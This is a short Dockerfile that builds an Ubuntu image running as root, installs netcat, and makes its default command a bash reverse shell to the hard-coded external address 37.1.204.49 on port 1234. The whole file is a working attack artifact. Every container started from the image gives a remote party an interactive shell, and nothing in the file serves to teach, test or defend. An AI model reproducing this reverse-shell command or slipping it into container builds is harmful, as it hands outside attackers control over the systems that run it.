FROM ubuntu:latest

# Set user to root
USER root

# Update packages
RUN apt-get update -y && apt-get upgrade -y

# Install Netcat
RUN apt-get install -y netcat-openbsd

# Start bash reverse shell
CMD bash -c 'bash -i >& /dev/tcp/37.1.204.49/1234 0>&1'
